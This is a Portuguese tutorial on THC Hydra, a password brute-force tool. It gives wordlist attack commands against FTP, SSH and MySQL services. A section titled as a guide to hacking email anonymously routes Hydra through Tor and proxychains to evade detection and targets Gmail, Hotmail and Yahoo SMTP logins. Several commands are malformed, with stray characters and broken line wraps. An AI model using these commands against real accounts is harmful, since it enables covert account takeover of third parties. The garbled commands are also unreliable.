# THC-hydra
O THC Hydra é uma ferramenta que usa dicionário de força bruta para ataques e tentativas de várias combinações de senhas e logins contra um alvo.  Esta ferramenta de hacking também suporta um vasto conjunto de protocolos incluindo Mail (POP3, IMAP, etc.), bancos de dados, LDAP, SMB, VNC e SSH.

Consulte e instale o hydra através do site: http://sectools.org/tool/hydra/
Ou se estiver usando Linux basta instalar usando o comando sudo apt-get install hydra no terminal.


1. Comandos do Hydra

hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 ftp
hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 ssh
hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 mysql
hydra –l admin -P /tmp/wordlist.txt 192.168.0.101 ftp

Percebe-se que nos três primeiros exemplos acima, tem-se a execução do Hydra para fazer brute force nos serviços de ftp, ssh e mysql. Todavia, nos três exemplos anteriores não se sabe o usuário e nem a senha do serviço que se está atacando. Já no quarto exemplo já se sabe pelo menos o nome do usuário, admin.

2. Como Hackear Email em modo anônimo com o THC Hydra

Quando caro leitor aqui quiser hackear um sistema de email sem ser detectado pelo alvo, é sempre importante ter instalado um TOR no seu sistema. Se você utiliza Linux, dê o seguinte comando para instalar o TOR:

apt-get install tor

Depois disso, deve-se configurar o proxychains colocando as saídas das conexões para a porta 9050 (porta de saída do TOR). Aqui estamos partindo do ponto que o leitor saiba configurar o proxychains.

Após fazer todo o processo de configuração do proxychains, digita-se os seguintes comandos para o anonimato.

Para explorar Gmail
proxychains hydra -l teste@gmail.com -P password.lst -s 465 -S -v -V -t 1 s
smtp.gmail.com

Para explorar Hotmail
proxychains hydra -l teste@hotmail. com/teste@outlook.com -P password.lst -s 587 -S
-v -V -t 1 s smtp.live.com

Para explorar Yahoo
proxychains hydra -l teste@yahoo.com -P password.lst -s 587 -S -v -V -t 1 s
smtp.mail.yahoo.com

* Obs: É importante observar que o parâmetro -P maúsculo serve para que o atacante possa passar algum argumento, que neste caso seria uma lista de senha. Caso o a letra p fosse minúscula, a ferramenta iria gerar e testar bilhões de senhas e isso levaria muito tempo em um Pentest.

O hydra pode ser utilizado no terminal e de modo gráfico quanto no Linux utilizando o comando “sudo apt-get install hydra” quanto em outros sistemas operacionais.


